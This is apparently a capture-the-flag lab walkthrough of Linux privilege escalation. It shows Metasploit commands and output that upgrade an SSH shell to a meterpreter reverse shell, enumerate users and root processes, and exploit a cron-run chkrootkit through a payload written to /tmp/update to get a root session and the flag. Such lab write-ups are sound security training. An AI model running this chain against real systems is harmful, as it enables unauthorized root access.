# Linux Privilege Escalation: Exploiting A Vulnerable Program

```bash
# Exploited SSH
pwd
/home/jackie
/bin/bash -i
bash: cannot set terminal process group (4159): Inappropriate ioctl for device
bash: no job control in this shell
jackie@demo:~$ 

# Upgrage to meterpreter session
msf6 auxiliary(scanner/ssh/ssh_login) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.109.100.2:4433 
[*] Sending stage (1017704 bytes) to 192.109.100.3
[*] Meterpreter session 2 opened (192.109.100.2:4433 -> 192.109.100.3:41976) at 2025-07-25 12:35:51 +0530
[*] Command stager progress: 100.00% (773/773 bytes)
```

Check privilege
```bash
meterpreter > shell
Process 5408 created.
Channel 1 created.
/bin/bash -i
bash: cannot set terminal process group (4159): Inappropriate ioctl for device
bash: no job control in this shell
jackie@demo:~$ 

# List all users (jackie, root)
jackie@demo:~$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

# See which process root has access to
jackie@demo:~$ ps aux
ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   4632  1536 ?        Ss   06:53   0:00 /bin/sh -c /usr/local/bin/start.sh
root           7  0.0  0.0  55116 20736 ?        S    06:53   0:00 /usr/bin/python /usr/bin/supervisord -n
root          12  0.0  0.0  28360  1920 ?        Ss   06:53   0:00 /usr/sbin/cron
root          22  0.0  0.0  72300  3840 ?        Ss   06:53   0:00 /usr/sbin/sshd
root          37  0.0  0.0   9924  2304 ?        S    06:54   0:00 /bin/bash /bin/check-down    <- Open this file
root        4141  0.0  0.0 101556  6528 ?        Ss   07:04   0:00 sshd: jackie [priv]
jackie      4152  0.0  0.0 103856  5784 ?        S    07:04   0:00 sshd: jackie@notty

jackie@demo:~$ cat /bin/check-down
cat /bin/check-down
#!/bin/bash
while :
do
        /usr/local/bin/chkrootkit/chkrootkit -x > /dev/null 2>&1
        sleep 60
done

jackie@demo:~$ ^Z
Background channel 1? [y/N]  y
meterpreter > 
Background session 2? [y/N] 
```

Exploit chkrootkit
```bash
msf6 auxiliary(scanner/ssh/ssh_login) > search chkrootkit

msf6 exploit(unix/local/chkrootkit) > set chkrootkit /bin/chkrootkit
chkrootkit => /bin/chkrootkit
msf6 exploit(unix/local/chkrootkit) > set session 2
session => 2

msf6 exploit(unix/local/chkrootkit) > set lhost  192.109.100.2
lhost => 192.109.100.2
msf6 exploit(unix/local/chkrootkit) > run

[*] Started reverse TCP handler on 192.109.100.2:4444 
[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux. This module works with: Unix.
[!] Rooting depends on the crontab (this could take a while)
[*] Payload written to /tmp/update
[*] Waiting for chkrootkit to run via cron...
[*] Sending stage (24768 bytes) to 192.109.100.3
[+] Deleted /tmp/update
[*] Meterpreter session 3 opened (192.109.100.2:4444 -> 192.109.100.3:59924) at 2025-07-25 12:50:38 +0530

meterpreter >

meterpreter > getuid
Server username: root

meterpreter > cat flag
9db8bf8f483ff50857f26f9bd636bed6
```